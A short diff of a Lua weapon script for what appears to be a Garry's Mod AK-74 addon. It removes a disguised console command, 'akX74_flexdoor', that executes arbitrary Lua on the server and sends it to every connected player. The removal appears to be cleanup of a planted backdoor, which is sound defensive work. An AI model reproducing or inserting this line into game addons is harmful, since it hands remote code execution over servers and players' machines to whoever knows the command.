@@ -68,5 +68,3 @@ SWEP.EmptySound    = "COP_Generic.Empty"
 SWEP.DeploySound   = "COP_AK74.Draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COPAK_74SCOP.ak74_reload"
-
-concommand.Add("akX74_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
